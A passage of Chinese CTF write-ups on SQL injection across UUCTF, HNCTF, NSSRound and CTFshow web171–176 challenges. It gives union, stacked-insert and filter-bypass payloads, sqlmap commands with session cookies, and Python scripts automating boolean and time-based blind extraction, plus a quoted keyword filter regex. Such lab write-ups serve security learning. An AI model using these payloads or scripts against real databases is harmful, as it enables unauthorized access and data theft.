<p>输入反转后的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#;1=1 ro ) &#x27;nimda</span><br></pre></td></tr></table></figure>

<p>发现登录进去了</p>
<p>判断字段回显位</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#;2,1 tceles noinu )&#x27;nimda</span><br></pre></td></tr></table></figure>

<p>两位 12</p>
<p>爆库</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#;)(esabatad,1 tceles noinu )&#x27;nimda</span><br></pre></td></tr></table></figure>

<p>UUCTF</p>
<p>or被过滤 爆表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#;)(esabatad=amehcs_elbat erehw selbat.amehcs_noitamrofni moorrf )(esabatad,)eman_elbat(tacnoc_puoorrg tceles noinu )&#x27;nimda</span><br></pre></td></tr></table></figure>

<p>flag,users</p>
<p>爆列</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#;)(esabatad=amehcs_elbat dna &#x27;galf&#x27;=eman_elbat erehw snmuloc.amehcs_noitamrofni moorrf )(esabatad,)eman_nmuloc(tacnoc_puoorrg tceles noinu )&#x27;nimda</span><br></pre></td></tr></table></figure>

<p>UUCTF</p>
<p>保值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#;galf moorrf )(esabatad,)FTCUU(tacnoc_puoorrg tceles noinu )&#x27;nimda</span><br></pre></td></tr></table></figure>

<p>&#x2F;&#x2F;Your Login name:NSSCTF{53358f22-a9b8-4397-99bd-a381194cc0d2}<br>&#x2F;&#x2F;Your Password:UUCTF</p>
<h1 id="HNCTF-2022-WEEK4-fun-sql"><a href="#HNCTF-2022-WEEK4-fun-sql" class="headerlink" title="[HNCTF 2022 WEEK4]fun_sql"></a>[HNCTF 2022 WEEK4]fun_sql</h1><p>源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;mysql.php&quot;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( <span class="variable">$_GET</span>[<span class="string">&#x27;uname&#x27;</span>] != <span class="string">&#x27;&#x27;</span> &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;uname&#x27;</span>])) &#123;</span><br><span class="line"></span><br><span class="line">  <span class="variable">$uname</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;uname&#x27;</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/regexp|left|extractvalue|floor|reverse|update|between|flag|=|&gt;|&lt;|and|\||right|substr|replace|char|&amp;|\\\$|0x|sleep|\#/i&quot;</span>,<span class="variable">$uname</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">    </span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM ccctttfff WHERE uname=&#x27;<span class="subst">$uname</span>&#x27;;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$sql</span>&lt;br&gt;&quot;</span>;</span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">  <span class="title function_ invoke__">mysqli_multi_query</span>(<span class="variable">$db</span>, <span class="variable">$sql</span>);</span><br><span class="line">  <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_store_result</span>(<span class="variable">$db</span>);</span><br><span class="line">  <span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_row</span>(<span class="variable">$result</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">if</span> (!<span class="variable">$row</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;something wrong&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="title function_ invoke__">print_r</span>(<span class="variable">$row</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$row</span>[<span class="string">&#x27;uname&#x27;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (<span class="variable">$row</span>[<span class="number">1</span>] === <span class="variable">$uname</span>)</span><br><span class="line">  &#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="variable">$flag</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>

<p>源码直接给出过滤的字符</p>
<p>1’’1注释闭合字符</p>
<p>暴力查字段 发现三段 都有回显</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?uname=0&#x27;union/**/select/**/1,2,3&#x27;1</span><br></pre></td></tr></table></figure>

<p>暴库</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?uname=0&#x27;union/**/select/**/1,database(),3&#x27;1</span><br></pre></td></tr></table></figure>

<p>ctf</p>
<ul>
<li><p><strong><code>/regexp|left|extractvalue|floor|reverse|update|between|flag|=|&gt;|&lt;|and|\||right|substr|replace|char|&amp;|\\\$|0x|sleep|\#/i</code></strong></p>
<p>这个正则表达式包含了多个关键词和符号，每个关键词或符号之间用 <code>|</code> 分隔，表示“或”关系。正则表达式中的每个部分分别匹配如下内容：</p>
<ol>
<li><strong><code>regexp</code></strong>: 匹配字符串 <code>regexp</code>。</li>
<li><strong><code>left</code></strong>: 匹配字符串 <code>left</code>。</li>
<li><strong><code>extractvalue</code></strong>: 匹配字符串 <code>extractvalue</code>。</li>
<li><strong><code>floor</code></strong>: 匹配字符串 <code>floor</code>。</li>
<li><strong><code>reverse</code></strong>: 匹配字符串 <code>reverse</code>。</li>
<li><strong><code>update</code></strong>: 匹配字符串 <code>update</code>。</li>
<li><strong><code>between</code></strong>: 匹配字符串 <code>between</code>。</li>
<li><strong><code>flag</code></strong>: 匹配字符串 <code>flag</code>。</li>
<li><strong><code>=</code></strong>: 匹配等号 <code>=</code>。</li>
<li><strong><code>&gt;</code></strong>: 匹配大于号 <code>&gt;</code>。</li>
<li><strong><code>&lt;</code></strong>: 匹配小于号 <code>&lt;</code>。</li>
<li><strong><code>and</code></strong>: 匹配字符串 <code>and</code>。</li>
<li><strong><code>\|</code></strong>: 匹配竖线符号 <code>|</code>。</li>
<li><strong><code>right</code></strong>: 匹配字符串 <code>right</code>。</li>
<li><strong><code>substr</code></strong>: 匹配字符串 <code>substr</code>。</li>
<li><strong><code>replace</code></strong>: 匹配字符串 <code>replace</code>。</li>
<li><strong><code>char</code></strong>: 匹配字符串 <code>char</code>。</li>
<li><strong><code>&amp;</code></strong>: 匹配符号 <code>&amp;</code>。</li>
<li><strong><code>\\$</code></strong>: 匹配美元符号 <code>$</code>，需要双反斜杠来转义。</li>
<li><strong><code>0x</code></strong>: 匹配十六进制前缀 <code>0x</code>。</li>
<li><strong><code>sleep</code></strong>: 匹配字符串 <code>sleep</code>。</li>
<li><strong><code>\#</code></strong>: 匹配井号 <code>#</code>。</li>
</ol>
</li>
<li><p><strong><code>/i</code></strong></p>
<p>这个模式修饰符表示不区分大小写匹配。</p>
</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="variable">$row</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;something wrong&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="title function_ invoke__">print_r</span>(<span class="variable">$row</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$row</span>[<span class="string">&#x27;uname&#x27;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (<span class="variable">$row</span>[<span class="number">1</span>] === <span class="variable">$uname</span>)</span><br><span class="line">  &#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="variable">$flag</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>单拿出来</p>
<ul>
<li><code>if ($row[1] === $uname)</code>: 检查 <code>$row</code> 数组中索引为 <code>1</code> 的元素是否等于 <code>$uname</code>。</li>
<li><code>die($flag);</code>: 如果相等，则终止脚本执行并输出 <code>$flag</code> 的值。</li>
</ul>
<p>我们直接插入一段自定义的列进去然后让uname等于我们自定义的列即可</p>
<p>之前讲过的insert注入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?uname=0&#x27;union/**/select/**/1,database(),3;insert/**/into/**/ccctttfff/**/values(&#x27;ss&#x27;,&#x27;Gu0f3n&#x27;,&#x27;1&#x27;);&#x27;1</span><br></pre></td></tr></table></figure>

<p>之后让uname&#x3D;Gu0f3n</p>
<p>NSSCTF{f87847e6-6220-417c-9b7b-2db8d9b5e9fb}</p>
<h1 id="NSSRound-1-Basic-sql-by-sql"><a href="#NSSRound-1-Basic-sql-by-sql" class="headerlink" title="[NSSRound#1 Basic]sql_by_sql"></a>[NSSRound#1 Basic]sql_by_sql</h1><p>存在二次注入</p>
<p>首先随便创建一个账号进入修改密码</p>
<p>查看源码</p>
<p> “ update user set password&#x3D;’%s’ where username&#x3D;’%s’; ”</p>
<p>那么我们只要创建一个admin’–+就可以绕过闭合</p>
<p>之后修改自己想要的密码登录admin</p>
<p><img src="/imgs/2024%E5%B9%B48%E6%9C%887%E6%97%A516%E7%82%B945%E5%88%86.png" alt="image-20240807164508710"></p>
<p>查询就两个回显 </p>
<p>exist 和no user </p>
<p>说明能够执行但没回显，没报错</p>
<p>考虑盲注</p>
<p>sqlmap试试</p>
<p><img src="/imgs/2024%E5%B9%B48%E6%9C%887%E6%97%A516%E7%82%B958%E5%88%86.png" alt="image-20240807165800615"></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>node4.anna.nssctf.cn:<span class="number">28285</span><span class="operator">/</span>query <span class="comment">--data=&#x27;id=1&#x27; --cookie=&#x27;eyJyb2xlIjoxLCJ1c2VybmFtZSI6ImFkbWluIn0.ZrM0kw.N-LX3sRXzmBn5q_pA4bwwPt9OAU&#x27;</span></span><br></pre></td></tr></table></figure>

<p>爆表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://node4.anna.nssctf.cn:28285/query --data=&#x27;id=1&#x27; --cookie=&#x27;eyJyb2xlIjoxLCJ1c2VybmFtZSI6ImFkbWluIn0.ZrM0kw.N-LX3sRXzmBn5q_pA4bwwPt9OAU&#x27; --tables</span><br></pre></td></tr></table></figure>

<p><img src="/imgs/2024%E5%B9%B48%E6%9C%887%E6%97%A517%E7%82%B900%E5%88%86.png" alt="image-20240807165948914"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://node4.anna.nssctf.cn:28285/query --data=&#x27;id=1&#x27; --cookie=&#x27;eyJyb2xlIjoxLCJ1c2VybmFtZSI6ImFkbWluIn0.ZrM0kw.N-LX3sRXzmBn5q_pA4bwwPt9OAU&#x27; --columns</span><br></pre></td></tr></table></figure>

<p>爆列</p>
<p><img src="/imgs/2024%E5%B9%B48%E6%9C%887%E6%97%A517%E7%82%B901%E5%88%86.png" alt="image-20240807170149812"></p>
<p>爆值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://node4.anna.nssctf.cn:28285/query --data=&#x27;id=1&#x27; --cookie=&#x27;eyJyb2xlIjoxLCJ1c2VybmFtZSI6ImFkbWluIn0.ZrM0kw.N-LX3sRXzmBn5q_pA4bwwPt9OAU&#x27; -T flag -C flag --dump</span><br></pre></td></tr></table></figure>

<p><img src="/imgs/2024%E5%B9%B48%E6%9C%887%E6%97%A517%E7%82%B903%E5%88%86.png" alt="image-20240807170351944"></p>
<p>NSSCTF{68025097-def3-4ea7-9dda-af4b16c6f1a4}</p>
<h1 id="NSSRound-3-Team-This1sMysql"><a href="#NSSRound-3-Team-This1sMysql" class="headerlink" title="[NSSRound#3 Team]This1sMysql"></a>[NSSRound#3 Team]This1sMysql</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;class.php&quot;</span>);</span><br><span class="line"><span class="variable">$conn</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;config&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">is_array</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;config&#x27;</span>]))&#123;</span><br><span class="line">  <span class="keyword">foreach</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;config&#x27;</span>] <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>)&#123;</span><br><span class="line">    <span class="variable">$value</span> = <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$var</span>)?(<span class="keyword">int</span>)<span class="variable">$val</span>:<span class="variable">$val</span>;</span><br><span class="line">    <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">set_opt</span>(<span class="variable">$key</span>, <span class="variable">$value</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;mysql&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">is_array</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;mysql&#x27;</span>]))&#123;</span><br><span class="line">  <span class="variable">$my</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;mysql&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">real_connect</span>(<span class="variable">$my</span>[<span class="string">&#x27;host&#x27;</span>], <span class="variable">$my</span>[<span class="string">&#x27;user&#x27;</span>], <span class="variable">$my</span>[<span class="string">&#x27;pass&#x27;</span>], <span class="variable">$my</span>[<span class="string">&#x27;dbname&#x27;</span>], <span class="variable">$my</span>[<span class="string">&#x27;port&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;connect success&quot;</span>;</span><br><span class="line">    <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;show databases;&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;connect fail&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="keyword">include</span>(<span class="string">&quot;function.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>sql刷题笔记</category>
      </categories>
      <tags>
        <tag>SQL</tag>
      </tags>
  </entry>
  <entry>
    <title>CTFshow</title>
    <url>/2024/08/08/CTFSHOW/</url>
    <content><![CDATA[<h2 id="web171"><a href="#web171" class="headerlink" title="web171"></a>web171</h2><p>查询语句</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//拼接sql语句查找指定ID用户</span><br><span class="line">$sql = &quot;select username,password from user where username !=&#x27;flag&#x27; and id = &#x27;&quot;.$_GET[&#x27;id&#x27;].&quot;&#x27; limit 1;&quot;;</span><br></pre></td></tr></table></figure>

<p>给了源码</p>
<p>闭合单引号 而且字段可以直接看出三列</p>
<p>爆库</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; union select 1,database(),3--+</span><br></pre></td></tr></table></figure>

<p>ctfshow_web</p>
<p>分析下给的源码</p>
<ol>
<li><strong>选择字段</strong><ul>
<li><code>select username, password</code>: 选择<code>user</code>表中的<code>username</code>和<code>password</code>列。</li>
</ul>
</li>
<li><strong>指定表</strong><ul>
<li><code>from user</code>: 指定查询的数据表为<code>user</code>。</li>
</ul>
</li>
<li><strong>条件</strong><ul>
<li><code>where username !=&#39;flag&#39;</code>: 条件是<code>username</code>不等于<code>&#39;flag&#39;</code>。这确保查询结果中不包含用户名为<code>flag</code>的记录。</li>
<li><code>and id = &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39;</code>: 条件是<code>id</code>等于从URL参数<code>id</code>获取的值。</li>
</ul>
</li>
<li><strong>限制结果</strong><ul>
<li><code>limit 1</code>: 限制查询结果最多返回一条记录。</li>
</ul>
</li>
</ol>
<p>参数可控可以猜测用户名为flag的用户就是我们的答案</p>
<p>万能密码绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;||1%23</span><br></pre></td></tr></table></figure>

<p>也可以or截断</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; or username = &#x27;flag</span><br></pre></td></tr></table></figure>

<p>ctfshow{1ae89b71-537e-4704-9493-f90aa665f1c0}</p>
<h2 id="web172"><a href="#web172" class="headerlink" title="web172"></a>web172</h2><p>查看源码</p>
<p>看到select.js</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">layui.<span class="title function_">use</span>(<span class="string">&#x27;form&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="keyword">var</span> form = layui.<span class="property">form</span>;</span><br><span class="line">  form.<span class="title function_">on</span>(<span class="string">&#x27;submit(*)&#x27;</span>, <span class="keyword">function</span>(<span class="params">data</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> id = data.<span class="property">field</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">    <span class="keyword">var</span> table = layui.<span class="property">table</span>;</span><br><span class="line">    table.<span class="title function_">reload</span>(<span class="string">&#x27;user_table&#x27;</span>, &#123;</span><br><span class="line">      <span class="attr">url</span>: <span class="string">&#x27;api/?id=&#x27;</span> + id</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">// 阻止表单默认提交行为</span></span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<ul>
<li>**<code>form.on(&#39;submit(\*)&#39;, function(data)&#123; ... &#125;)</code>**：监听表单提交事件，获取表单字段中的<code>id</code>值，并重新加载表格数据。</li>
</ul>
<p>注入点为id字段 单引号闭合</p>
<p>尝试上一关的payload</p>
<p>{“id”:”26”,”username”:”flag”,”password”:”flag_not_here”}]}</p>
<p>发现不在这</p>
<p>老实注</p>
<p>字段为3位</p>
<p>爆库名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">api/?id=1&#x27; union select 1,database(),3--+</span><br></pre></td></tr></table></figure>

<p>{“id”:”1”,”username”:”ctfshow_web”,”password”:”3”}]}</p>
<p>爆表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">api/?id=1&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+</span><br></pre></td></tr></table></figure>

<p>{“id”:”1”,”username”:”ctfshow_user,ctfshow_user2”,”password”:”3”}]}</p>
<p>password表没东西</p>
<p>ctfshow_user,ctfshow_user2的列一样</p>
<p>id,username,password</p>
<p>爆值</p>
<p>在第二张表里</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">api/?id=1&#x27; union select 1,group_concat(id,username,password),3 from ctfshow_user2--+</span><br></pre></td></tr></table></figure>

<p>ctfshow{b7520f1e-a489-493c-aabb-e1e978bae8cc}</p>
<h2 id="web173"><a href="#web173" class="headerlink" title="web173"></a>web173</h2><p>依旧是在api这个接口</p>
<p>多了一张表3其余和上一关一样</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">api/?id=1&#x27; union select 1,group_concat(id,username,password),3 from ctfshow_user3--+</span><br></pre></td></tr></table></figure>

<h2 id="web174"><a href="#web174" class="headerlink" title="web174"></a>web174</h2><p>这里在api路由这里没回显</p>
<p>直接看无过滤注入4模块</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//检查结果是否有flag</span></span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/flag|[0-9]/i&#x27;</span>, <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>)))&#123;</span><br><span class="line">      <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;查询成功&#x27;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>有过滤的字符型注入，更改正则表达式 <code>/flag|[0-9]/i</code>，返回结果中不能有数字</p>
<p>考虑盲注</p>
<p>抓包接口是api&#x2F;v4.php</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0&#x27; union select &#x27;a&#x27;,if(ascii(substr((select password from ctfshow_user4 where username=&#x27;flag&#x27;), &#123;&#125;,1))&gt;&#123;&#125;,&#x27;lbw&#x27;,&#x27;xyz&#x27;) %23</span><br></pre></td></tr></table></figure>

<p>这里稍稍解释下吧</p>
<p>编写盲注脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提取常量</span></span><br><span class="line">PAYLOAD_TEMPLATE = <span class="string">&quot;0&#x27; union select &#x27;a&#x27;,if(ascii(substr((select password from ctfshow_user4 where username=&#x27;flag&#x27;), &#123;&#125;,1))&gt;&#123;&#125;,&#x27;lbw&#x27;,&#x27;xyz&#x27;) %23&quot;</span></span><br><span class="line">URL = <span class="string">&quot;http://d0a608fb-8c33-4e69-abbc-5429035225b4.challenge.ctf.show/api/v4.php?id=&quot;</span></span><br><span class="line">ASCII_START = <span class="number">32</span></span><br><span class="line">ASCII_END = <span class="number">127</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test_chr</span>(<span class="params">index: <span class="built_in">int</span>, offset: <span class="built_in">int</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    response = requests.get(URL + PAYLOAD_TEMPLATE.<span class="built_in">format</span>(index, offset))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;lbw&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="string">&quot;xyz&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;Unexpected response content&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_flag</span>() -&gt; <span class="built_in">str</span>:</span><br><span class="line">    index = <span class="number">1</span></span><br><span class="line">    flag = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        start, end = ASCII_START, ASCII_END</span><br><span class="line">        <span class="keyword">while</span> start &lt; end:</span><br><span class="line">            point = (start + end) // <span class="number">2</span></span><br><span class="line">            <span class="keyword">if</span> test_chr(index, point):</span><br><span class="line">                start = point + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                end = point</span><br><span class="line">        flag += <span class="built_in">chr</span>(end)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[*] flag: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line">        index += <span class="number">1</span></span><br><span class="line">        <span class="comment"># 假设我们知道flag的结束字符，这里可以设置退出条件</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(flag) &gt; <span class="number">50</span>:  <span class="comment"># 这个条件可以根据实际情况调整</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    final_flag = find_flag()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Final flag: <span class="subst">&#123;final_flag&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="comment">#ctfshow&#123;fe9a4453-ad08-4e6f-a83c-bcc2aa982a77&#125;</span></span><br></pre></td></tr></table></figure>

<p>ctfshow{fe9a4453-ad08-4e6f-a83c-bcc2aa982a77}</p>
<h2 id="web175"><a href="#web175" class="headerlink" title="web175"></a>web175</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//检查结果是否有flag</span></span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[\x00-\x7f]/i&#x27;</span>, <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>)))&#123;</span><br><span class="line">      <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;查询成功&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">      </span><br></pre></td></tr></table></figure>

<p>也就是说什么都不会返回</p>
<p>考虑时间盲注</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and sleep(2) %23</span><br></pre></td></tr></table></figure>

<p>可行</p>
<p>上一关步骤一样</p>
<p>编写脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 常量</span></span><br><span class="line">CHAR_SET = <span class="string">&#x27;1234567890-_&#123;&#125;qwertyuiopasdfghjklzxcvbnm&#x27;</span>  <span class="comment"># 字符集</span></span><br><span class="line">BASE_URL = <span class="string">&#x27;http://80f58198-ee06-4a46-a2cc-3f2aea94e556.challenge.ctf.show/api/v5.php?id=&#123;&#125;&amp;page=1&amp;limit=1&#x27;</span></span><br><span class="line">DELAY_THRESHOLD = <span class="number">2</span>  <span class="comment"># 延迟时间（秒）</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_correct_char</span>(<span class="params">position: <span class="built_in">int</span>, char: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;判断指定字符是否在特定位置&quot;&quot;&quot;</span></span><br><span class="line">    sql_payload = <span class="string">&quot;1&#x27; and if(substr((select password from ctfshow_user5 where username=&#x27;flag&#x27;),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;,sleep(&#123;&#125;),0) %23&quot;</span>.<span class="built_in">format</span>(position, char, DELAY_THRESHOLD)</span><br><span class="line">    url = BASE_URL.<span class="built_in">format</span>(sql_payload)</span><br><span class="line">    start_time = time.time()</span><br><span class="line">    requests.get(url)</span><br><span class="line">    elapsed_time = time.time() - start_time</span><br><span class="line">    <span class="keyword">return</span> elapsed_time &gt;= DELAY_THRESHOLD</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_flag</span>(<span class="params">max_length: <span class="built_in">int</span> = <span class="number">64</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;逐字符地提取 flag&quot;&quot;&quot;</span></span><br><span class="line">    extracted_flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, max_length + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> CHAR_SET:</span><br><span class="line">            <span class="keyword">if</span> is_correct_char(pos, char):</span><br><span class="line">                extracted_flag += char</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;[*] Extracted flag so far: <span class="subst">&#123;extracted_flag&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> extracted_flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    final_flag = extract_flag()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Final extracted flag: <span class="subst">&#123;final_flag&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="comment">#ctfshow&#123;7b9f5582-39db-4e99-bed6-9da1772ed2ba&#125;</span></span><br></pre></td></tr></table></figure>

<p>ctfshow{7b9f5582-39db-4e99-bed6-9da1772ed2ba}</p>
<h2 id="web176"><a href="#web176" class="headerlink" title="web176"></a>web176</h2><p>过滤了union select </p>
<p>大小写绕过</p>
<p>万能密码可以直接绕过</p>
